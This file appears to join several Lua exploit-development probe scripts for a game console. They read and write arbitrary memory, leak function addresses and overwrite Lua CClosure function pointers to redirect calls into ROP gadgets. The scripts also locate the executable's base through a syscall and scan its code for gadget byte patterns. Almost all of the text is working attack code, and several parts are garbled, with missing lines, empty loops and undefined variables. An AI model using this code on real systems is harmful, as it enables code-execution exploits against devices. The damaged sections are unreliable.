local pairs_addr = parse_func_addr(pairs)

print("[INFO] Addresses:")
print("  type:     " .. hexval(type_addr))
print("  tostring: " .. hexval(tostring_addr))
print("  rawget:   " .. hexval(rawget_addr))
print("  rawequal: " .. hexval(rawequal_addr))
print("  select:   " .. hexval(select_addr))
print("  pairs:    " .. hexval(pairs_addr))

if not type_addr then
    print("ABORT: no type addr")
    return
end

local type_20_hi = safe_rd(type_addr + 0x24)
local tostring_20_lo = tostring_addr and safe_rd(tostring_addr + 0x20) or nil
local tostring_20_hi = tostring_addr and safe_rd(tostring_addr + 0x24) or nil
local rawequal_20_lo = rawequal_addr and safe_rd(rawequal_addr + 0x20) or nil
local rawequal_20_hi = rawequal_addr and safe_rd(rawequal_addr + 0x24) or nil

print(string.format("  tostring +0x20: lo=0x%08X hi=0x%08X", tostring_20_lo or 0, tostring_20_hi or 0))

-- ============================================================

-- Write low dword to tostring's, then immediately restore
memory.write_dword(type_addr + 0x20, tostring_20_lo)
memory.write_dword(type_addr + 0x20, type_20_lo)
print("  MARKER_A_AFTER_RESTORE")
print("  verify type(42): " .. tostring(type(42)))

-- ============================================================
-- [B] Same but with a call between write and restore
-- ============================================================

memory.write_dword(type_addr + 0x20, type_20_lo)

if rawequal_addr and rawget_addr then
    local rawget_20_lo = safe_rd(rawget_addr + 0x20)
    print("  MARKER_D_BEFORE_WRITE")
    memory.write_dword(rawequal_addr + 0x20, rawget_20_lo)
    -- rawequal(t, "key") should now behave like rawget(t, "key")
    local test_t = {foo = "bar", baz = 123}
    local d_result = rawequal(test_t, "foo")
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    print("  MARKER_D_AFTER_RESTORE")
    print("  result: " .. tostring(d_result))
    print("  verify rawequal(1,1): " .. tostring(rawequal(1,1)))
else
    print("  SKIP")
end

-- ============================================================

-- then try to make Lua call through our fake object
-- ============================================================

print("[E] Fake CClosure on heap")

-- Copy type's full CClosure (80 bytes)
for off = 0, 0x48, 4 do

end

safe_wd(fake + 0x24, tostring_20_hi or 0)
print("  fake CClosure at: " .. hexval(fake))
print("  fake +0x20: " .. string.format("0x%08X_%08X", safe_rd(fake + 0x24) or 0, safe_rd(fake + 0x20) or 0))
-- The fake object exists but we can't easily make Lua call through it
-- without setting up the GC link or stack frame. Report the structure.
print("  (can't call through fake without stack setup)")

-- ============================================================
-- [F] Test: does print() use type() internally?
-- Write +0x20 to something harmless, try print
-- ============================================================
print("")
print("[F] Does print use type()? Write type +0x20 = tostring, then print a literal")
print("  MARKER_F_BEFORE_WRITE")
memory.write_dword(type_addr + 0x20, tostring_20_lo)
-- Try to print a simple string literal — if print internally calls type(),
-- this will dispatch to tostring instead
print("  MARKER_F_PRINT_TEST_LITERAL")
memory.write_dword(type_addr + 0x20, type_20_lo)
print("  MARKER_F_AFTER_RESTORE")

collectgarbage("restart")

print("")
print("=== PROBE 56b COMPLETE ===")
```

```lua
--
-- Context: All writes to type()+0x20 hang because memory.write_dword

-- the internal type() call dispatches to the wrong function.
--
-- Solution: redirect functions the VM never calls internally:
--   rawequal, rawget, rawlen, select, pairs
-- These are only called explicitly from Lua code, never by the VM itself.

print("=== PROBE 56c: REDIRECT NON-VM FUNCTIONS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local tostring_addr = parse_func_addr(tostring)
```

## probes/phase14_final_push/56d_gadget_redirect.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56d: Redirect CClosure to eboot gadgets
--
-- Context: 56c CONFIRMED controlled function redirect works on non-VM
-- functions (rawequal, rawget, select). All four redirects returned
-- the target function's output correctly.
--
-- Now: redirect to eboot RX gadgets instead of other C functions.
-- Known eboot gadgets (offsets from 41r/41s/41t/41v):
--   ret           = eboot+0x42
--   pop rax; ret  = eboot+0x992
--   pop rdi; ret  = eboot+0xC9DFE
--   pop rsi; ret  = eboot+0xD77D  (41r)
--   pop rdx; ret  = eboot+0x420E6D
--
-- When a CClosure dispatch goes to "ret", the C ABI return value (eax)
-- determines how many results Lua sees. Random eax = unpredictable but
-- non-hanging behavior. If eax=0, Lua sees no return (nil).
--
-- Strategy: use rawequal as our redirectable function.
-- [A] Redirect rawequal -> "ret" gadget: test bare gadget exec
-- [B] Redirect rawequal -> "pop rax; ret": pops from stack, may crash
-- [C] Find "xor eax, eax; ret" in eboot for clean 0-return
-- [D] Redirect rawequal -> make_syscall's known C handler (getpid test)

print("=== PROBE 56d: GADGET REDIRECT VIA CCLOSURE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo))
    end
    return nil
end

local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)
local eboot_base = get_eboot_base()

print("[INFO] Addresses:")
print("  rawequal:   " .. hexval(rawequal_addr))
print("  rawget:     " .. hexval(rawget_addr))
print("  eboot base: " .. hexval(eboot_base))

if not rawequal_addr or not eboot_base then
    print("ABORT: missing addresses")
    return
end

-- Read original +0x20 values
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)
print(string.format("  rawequal +0x20: lo=0x%08X hi=0x%08X", rawequal_20_lo or 0, rawequal_20_hi or 0))

-- Compute gadget absolute addresses
local eboot_lo = to_num(eboot_base)
local eboot_hi_val = 0
do
    local h, l = get_hi_lo(eboot_base)
    eboot_hi_val = h
    eboot_lo = l
end

-- Gadget offsets from eboot base
local gadget_ret_off     = 0x42
local gadget_pop_rax_off = 0x992
local gadget_pop_rdi_off = 0xC9DFE
local gadget_pop_rsi_off = 0xD77D
local gadget_pop_rdx_off = 0x420E6D

-- Compute absolute addresses (carry-safe)
local function eboot_gadget(offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi_val
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return lo, hi
end

local ret_lo, ret_hi = eboot_gadget(gadget_ret_off)
local pop_rax_lo, pop_rax_hi = eboot_gadget(gadget_pop_rax_off)
local pop_rdi_lo, pop_rdi_hi = eboot_gadget(gadget_pop_rdi_off)

print(string.format("  ret gadget:     0x%08X_%08X", ret_hi, ret_lo))
print(string.format("  pop rax gadget: 0x%08X_%08X", pop_rax_hi, pop_rax_lo))
print(string.format("  pop rdi gadget: 0x%08X_%08X", pop_rdi_hi, pop_rdi_lo))

-- Verify gadget bytes are readable (eboot .text is RX)
local ret_byte = safe_rd(uint64(string.format("0x%X%08X", ret_hi, ret_lo)))
local pop_rax_byte = safe_rd(uint64(string.format("0x%X%08X", pop_rax_hi, pop_rax_lo)))
print(string.format("  ret gadget bytes:     0x%08X", ret_byte or 0))
print(string.format("  pop rax gadget bytes: 0x%08X", pop_rax_byte or 0))

-- ============================================================
-- [A] Scan eboot for "xor eax, eax; ret" (31 C0 C3)
-- This is the safest gadget: returns 0 to Lua (= nil)
-- ============================================================
print("")
print("[A] Scanning eboot for xor eax,eax;ret (31 C0 C3)")

local xor_eax_ret_off = nil
-- Scan eboot .text in 4-byte aligned dword reads looking for 31C0C3
-- Pattern: byte 0x31, 0xC0, 0xC3 at any alignment
local scan_limit = 0x100000  -- scan first 1MB of eboot
local scan_step = 1  -- byte-level via dword reads

for off = 0, scan_limit - 4, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + off))
    local dw = safe_rd(addr)
    if dw then
        -- Check all 4 byte positions for 31 C0 C3
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256
        -- 31 C0 C3 starting at byte 0
        if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
            xor_eax_ret_off = off
            break
        end
        -- starting at byte 1
        if b1 == 0x31 and b2 == 0xC0 and b3 == 0xC3 then
            xor_eax_ret_off = off + 1
            break
        end
    end
    -- Also check cross-dword boundary: last byte of this + first 2 of next
    if off < scan_limit - 8 and dw then
        local b3 = math.floor(dw / 16777216) % 256
        if b3 == 0x31 then
            local next_addr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + off + 4))
            local ndw = safe_rd(next_addr)
            if ndw then
                local nb0 = ndw % 256
                local nb1 = math.floor(ndw / 256) % 256
                if nb0 == 0xC0 and nb1 == 0xC3 then
                    xor_eax_ret_off = off + 3
                    break
                end
            end
        end
    end
    -- Check: last 2 bytes of this dword + first byte of next
    if off < scan_limit - 8 and dw then
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256
        if b2 == 0x31 and b3 == 0xC0 then
            local next_addr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + off + 4))
            local ndw = safe_rd(next_addr)
            if ndw then
                local nb0 = ndw % 256
                if nb0 == 0xC3 then
                    xor_eax_ret_off = off + 2
                    break
                end
            end
        end
    end
end

if xor_eax_ret_off then
    print(string.format("  FOUND xor eax,eax;ret at eboot+0x%X", xor_eax_ret_off))
    -- Verify bytes
    local gaddr = uint64(string.format("0x%X%08X", eboot_hi_val, eboot_lo + xor_eax_ret_off))
    local vb = safe_rd(gaddr)
    print(string.format("  verify bytes: 0x%08X (expect 0x??C3C031 or similar)", vb or 0))
else
    print("  NOT FOUND in first 1MB")
end

collectgarbage("stop")

-- ============================================================
-- [B] Redirect rawequal -> "ret" gadget (eboot+0x42)
-- C3 = ret. Returns whatever is in eax. Lua interprets eax as
-- the number of return values pushed onto the Lua stack.
-- ============================================================
print("")
print("[B] Redirect rawequal -> ret gadget (eboot+0x42)")
print("  Baseline rawequal(1,1) = " .. tostring(rawequal(1,1)))
print("  MARKER_B_BEFORE_WRITE")
memory.write_dword(rawequal_addr + 0x20, ret_lo)
memory.write_dword(rawequal_addr + 0x24, ret_hi)
print("  MARKER_B_AFTER_WRITE")
local b_ok, b_r1, b_r2, b_r3 = pcall(rawequal, 1, 1)
print("  MARKER_B_AFTER_CALL")
print("  pcall ok=" .. tostring(b_ok))
print("  r1=" .. tostring(b_r1) .. " r2=" .. tostring(b_r2) .. " r3=" .. tostring(b_r3))
-- Restore
memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  MARKER_B_RESTORED")
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [C] Redirect rawequal -> xor eax,eax;ret (if found)
-- Should cleanly return 0 results = nil from Lua
-- ============================================================
print("")
if xor_eax_ret_off then
    print("[C] Redirect rawequal -> xor eax,eax;ret (eboot+0x" .. string.format("%X", xor_eax_ret_off) .. ")")
    local xor_lo, xor_hi = eboot_gadget(xor_eax_ret_off)
    print("  MARKER_C_BEFORE_WRITE")
    memory.write_dword(rawequal_addr + 0x20, xor_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_hi)
    print("  MARKER_C_AFTER_WRITE")
    local c_ok, c_r1 = pcall(rawequal, 1, 1)
    print("  MARKER_C_AFTER_CALL")
    print("  pcall ok=" .. tostring(c_ok) .. " r1=" .. tostring(c_r1))
    print("  (expected: ok=true r1=nil since eax=0 means 0 return values)")
    -- Restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  MARKER_C_RESTORED")
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("[C] SKIP: no xor eax,eax;ret found")
end

-- ============================================================
-- [D] Redirect rawequal -> pop rax; ret (eboot+0x992)
-- 58 C3: pops 8 bytes from the stack into rax, then returns.
-- The popped value becomes rax (Lua return count).

print("  MARKER_D_BEFORE_WRITE")

print("  pcall ok=" .. tostring(d_ok) .. " r1=" .. tostring(d_r1) .. " r2=" .. tostring(d_r2))
-- Restore

memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  MARKER_D_RESTORED")
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- Step 2: rawequal -> type (careful: type is used by VM, but we're only
-- writing to rawequal's +0x20, not type's +0x20, so this is safe)

memory.write_dword(rawequal_addr + 0x24, type_20_hi)

local f3 = rawequal("hello")

-- Step 3: restore

memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  restored, rawequal(1,1) = " .. tostring(rawequal(1,1)))

collectgarbage("restart")

print("=== PROBE 56d COMPLETE ===")
```

```lua
-- PROBE 56e: Clean gadget execution via CClosure redirect
--
-- Context: 56d proved eboot gadgets execute via CClosure +0x20 redirect.
-- "ret" gadget ran but eax was garbage → Lua read garbage returns.
-- "pop rax; ret" crashed (consumed return address).
-- "xor eax,eax; ret" at eboot+0x471 should cleanly return 0 → nil.
--
-- This probe focuses on SAFE gadgets only:
--   [A] xor eax,eax; ret (eboot+0x471) — returns 0 results = nil
--   [B] Multiple calls to xor eax,eax;ret to prove repeatability
--   [C] Redirect rawget to xor eax,eax;ret (second function test)
--   [D] Redirect select to xor eax,eax;ret (third function test)
--   [E] Timing: 100 redirect+call+restore cycles
--   [F] mov eax,1; ret scan — if found, returns exactly 1 result

print("=== PROBE 56e: CLEAN GADGET EXECUTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo))
    end
    return nil
end

local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)
local select_addr = parse_func_addr(select)
local eboot_base = get_eboot_base()

print("[INFO] Addresses:")
print("  rawequal:   " .. hexval(rawequal_addr))
print("  rawget:     " .. hexval(rawget_addr))
print("  select:     " .. hexval(select_addr))
print("  eboot base: " .. hexval(eboot_base))

if not rawequal_addr or not eboot_base then
    print("ABORT: missing addresses")
    return
end

local eboot_hi, eboot_lo = get_hi_lo(eboot_base)

local function eboot_gadget(offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return lo, hi
end

-- Save originals
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)
local rawget_20_lo = safe_rd(rawget_addr + 0x20)
local rawget_20_hi = safe_rd(rawget_addr + 0x24)
local select_20_lo = safe_rd(select_addr + 0x20)
local select_20_hi = safe_rd(select_addr + 0x24)

-- xor eax,eax; ret = eboot+0x471 (confirmed in 56d)
local xor_ret_lo, xor_ret_hi = eboot_gadget(0x471)
print(string.format("  xor eax,eax;ret: 0x%08X_%08X", xor_ret_hi, xor_ret_lo))

-- Verify the gadget bytes
local xor_addr = uint64(string.format("0x%X%08X", xor_ret_hi, xor_ret_lo))
local xor_bytes = safe_rd(xor_addr)
print(string.format("  gadget bytes: 0x%08X (expect 0x??C3C031)", xor_bytes or 0))
local b0 = (xor_bytes or 0) % 256
local b1 = math.floor((xor_bytes or 0) / 256) % 256
local b2 = math.floor((xor_bytes or 0) / 65536) % 256
if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
    print("  CONFIRMED: 31 C0 C3 = xor eax,eax; ret")
else
    print(string.format("  WARNING: bytes are %02X %02X %02X, not 31 C0 C3", b0, b1, b2))
end

collectgarbage("stop")

-- ============================================================
-- [A] Redirect rawequal -> xor eax,eax;ret
-- eax=0 means 0 Lua return values. pcall should return true,nil
-- ============================================================
print("")
print("[A] Redirect rawequal -> xor eax,eax;ret")
print("  Baseline rawequal(1,1) = " .. tostring(rawequal(1,1)))
print("  MARKER_A_BEFORE_WRITE")
memory.write_dword(rawequal_addr + 0x20, xor_ret_lo)
memory.write_dword(rawequal_addr + 0x24, xor_ret_hi)
print("  MARKER_A_AFTER_WRITE")
local a_ok, a_r1, a_r2 = pcall(rawequal, 1, 1)
print("  MARKER_A_AFTER_CALL")
print("  pcall ok=" .. tostring(a_ok) .. " r1=" .. tostring(a_r1) .. " r2=" .. tostring(a_r2))
-- Try direct call (no pcall)
local a_direct = rawequal(42, 99)
print("  direct call result: " .. tostring(a_direct))
-- Restore
memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
print("  MARKER_A_RESTORED")
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [B] Repeatability: 10 redirect+call+restore cycles
-- ============================================================
print("")
print("[B] 10 redirect+call+restore cycles (xor eax,eax;ret)")
local b_results = {}
for i = 1, 10 do
    memory.write_dword(rawequal_addr + 0x20, xor_ret_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_ret_hi)
    local ok, r1 = pcall(rawequal, i, i)
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    b_results[i] = string.format("ok=%s r1=%s", tostring(ok), tostring(r1))
end
for i = 1, 10 do
    print("  cycle " .. i .. ": " .. b_results[i])
end
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [C] Redirect rawget -> xor eax,eax;ret
-- ============================================================
print("")
print("[C] Redirect rawget -> xor eax,eax;ret")
print("  Baseline rawget({x=1},'x') = " .. tostring(rawget({x=1}, "x")))
memory.write_dword(rawget_addr + 0x20, xor_ret_lo)
memory.write_dword(rawget_addr + 0x24, xor_ret_hi)
local c_ok, c_r1 = pcall(rawget, {x=1}, "x")
print("  pcall ok=" .. tostring(c_ok) .. " r1=" .. tostring(c_r1))
-- Direct
local c_direct = rawget({x=1}, "x")
print("  direct: " .. tostring(c_direct))
-- Restore
memory.write_dword(rawget_addr + 0x20, rawget_20_lo)
memory.write_dword(rawget_addr + 0x24, rawget_20_hi)
print("  verify rawget({x=1},'x') = " .. tostring(rawget({x=1}, "x")))

-- ============================================================
-- [D] Redirect select -> xor eax,eax;ret
-- ============================================================
print("")
print("[D] Redirect select -> xor eax,eax;ret")
print("  Baseline select(1,'a','b') = " .. tostring(select(1, "a", "b")))
memory.write_dword(select_addr + 0x20, xor_ret_lo)
memory.write_dword(select_addr + 0x24, xor_ret_hi)
local d_ok, d_r1 = pcall(select, 1, "a", "b")
print("  pcall ok=" .. tostring(d_ok) .. " r1=" .. tostring(d_r1))
-- Restore
memory.write_dword(select_addr + 0x20, select_20_lo)
memory.write_dword(select_addr + 0x24, select_20_hi)
print("  verify select(1,'a','b') = " .. tostring(select(1, "a", "b")))

-- ============================================================
-- [E] Timing: 100 full redirect+call+restore cycles
-- ============================================================
print("")
print("[E] Timing: 100 redirect+call+restore cycles")
local t0 = os.clock()
for i = 1, 100 do
    memory.write_dword(rawequal_addr + 0x20, xor_ret_lo)
    memory.write_dword(rawequal_addr + 0x24, xor_ret_hi)
    rawequal(1, 1)
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
end
local t1 = os.clock()
print(string.format("  100 cycles: %.4fs (%.6fs each)", t1 - t0, (t1 - t0) / 100))
print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))

-- ============================================================
-- [F] Scan for mov eax,1; ret (B8 01 00 00 00 C3)
-- Returns exactly 1 Lua result (the top of the Lua stack)
-- ============================================================
print("")
print("[F] Scanning eboot for mov eax,1;ret (B8 01000000 C3)")
local mov1_off = nil
for off = 0, 0x100000 - 8, 4 do
    local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
    local dw1 = safe_rd(addr)
    local dw2 = safe_rd(addr + 4)
    if dw1 and dw2 then
        -- B8 01 00 00 at byte 0 of dw1, 00 C3 at bytes 0-1 of dw2
        local a0 = dw1 % 256
        local a1 = math.floor(dw1 / 256) % 256
        local a2 = math.floor(dw1 / 65536) % 256
        local a3 = math.floor(dw1 / 16777216) % 256
        local b0 = dw2 % 256
        local b1 = math.floor(dw2 / 256) % 256
        -- B8 01 00 00 00 C3 starting at byte 0
        if a0 == 0xB8 and a1 == 0x01 and a2 == 0x00 and a3 == 0x00 and b0 == 0x00 and b1 == 0xC3 then
            mov1_off = off
            break
        end
        -- starting at byte 1
        if a1 == 0xB8 and a2 == 0x01 and a3 == 0x00 and b0 == 0x00 and b1 == 0x00 then
            local b2 = math.floor(dw2 / 65536) % 256
            if b2 == 0xC3 then
                mov1_off = off + 1
                break
            end
        end
        -- starting at byte 2
        if a2 == 0xB8 and a3 == 0x01 and b0 == 0x00 and b1 == 0x00 then
            local b2 = math.floor(dw2 / 65536) % 256
            local b3 = math.floor(dw2 / 16777216) % 256
            if b2 == 0x00 and b3 == 0xC3 then
                mov1_off = off + 2
                break
            end
        end
        -- starting at byte 3
        if a3 == 0xB8 and b0 == 0x01 and b1 == 0x00 then
            local b2 = math.floor(dw2 / 65536) % 256
            local b3 = math.floor(dw2 / 16777216) % 256
            if b2 == 0x00 and b3 == 0x00 then
                -- Need byte 0 of NEXT dword = C3
                local dw3 = safe_rd(addr + 8)
                if dw3 and (dw3 % 256) == 0xC3 then
                    mov1_off = off + 3
                    break
                end
            end
        end
    end
end

if mov1_off then
    print(string.format("  FOUND mov eax,1;ret at eboot+0x%X", mov1_off))
    local mov1_lo, mov1_hi = eboot_gadget(mov1_off)
    -- Test it: should return 1 result (whatever is on top of Lua stack)
    print("  Testing redirect...")
    memory.write_dword(rawequal_addr + 0x20, mov1_lo)
    memory.write_dword(rawequal_addr + 0x24, mov1_hi)
    local f_ok, f_r1, f_r2 = pcall(rawequal, 42, 99)
    print("  pcall ok=" .. tostring(f_ok) .. " r1=" .. tostring(f_r1) .. " r2=" .. tostring(f_r2))
    print("  (eax=1 means Lua reads 1 return value from stack top)")
    -- Restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("  NOT FOUND in first 1MB")
end

collectgarbage("restart")

print("")
print("=== PROBE 56e COMPLETE ===")
```

```lua
-- CRASH_CLASS: LOW
-- PROBE 56f: Controlled return values via gadgets + stack reading
--
-- Context: 56e confirmed xor eax,eax;ret executes cleanly and reliably
-- (100/100 cycles, 65us each). Now we need gadgets that return useful
-- values to Lua.
--
-- Strategy:
--   [A] Safe scan for mov eax,1;ret (B8 01 00 00 00 C3) — smaller range
--   [B] Safe scan for mov eax,2;ret (B8 02 00 00 00 C3)
--   [C] Test mov eax,N;ret — returns N items from Lua stack
--   [D] Scan for "inc eax; ret" (FF C0 C3) — increments eax
--   [E] Read lua_State pointer from CClosure to understand C call ABI
--   [F] Test: redirect to a C function that writes to a known buffer

print("=== PROBE 56f: CONTROLLED RETURN VALUES ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo))
    end
    return nil
end

local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)
local select_addr = parse_func_addr(select)
local eboot_base = get_eboot_base()

print("[INFO] Addresses:")
print("  rawequal:   " .. hexval(rawequal_addr))
print("  eboot base: " .. hexval(eboot_base))

if not rawequal_addr or not eboot_base then
    print("ABORT: missing addresses")
    return
end

local eboot_hi, eboot_lo = get_hi_lo(eboot_base)

local function eboot_gadget(offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return lo, hi
end

-- Save originals
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)

-- Known: xor eax,eax;ret at eboot+0x471
local xor_ret_lo, xor_ret_hi = eboot_gadget(0x471)

-- Safe scan helper: reads dwords with pcall, stops on failure
local function scan_bytes(pattern, max_off)
    local plen = #pattern
    for off = 0, max_off - 4, 4 do
        local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
        local dw = safe_rd(addr)
        if not dw then break end  -- stop on unreadable page
        local bytes = {
            dw % 256,
            math.floor(dw / 256) % 256,
            math.floor(dw / 65536) % 256,
            math.floor(dw / 16777216) % 256,
        }
        -- Check pattern starting at each byte position
        for pos = 1, 4 do
            local match = true
            local needed = {}
            for i = 1, plen do
                local idx = pos + i - 1
                if idx <= 4 then
                    needed[i] = bytes[idx]
                else
                    -- Need bytes from next dword
                    local next_byte_off = idx - 4
                    if not needed._next then
                        local naddr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off + 4))
                        local ndw = safe_rd(naddr)
                        if not ndw then match = false; break end
                        needed._next = {
                            ndw % 256,
                            math.floor(ndw / 256) % 256,
                            math.floor(ndw / 65536) % 256,
                            math.floor(ndw / 16777216) % 256,
                        }
                    end
                    needed[i] = needed._next[next_byte_off]
                end
            end
            if match then
                local all_match = true
                for i = 1, plen do
                    if needed[i] ~= pattern[i] then all_match = false; break end
                end
                if all_match then
                    return off + pos - 1
                end
            end
        end
    end
    return nil
end

print("")

for off = 0x00, 0x48, 8 do
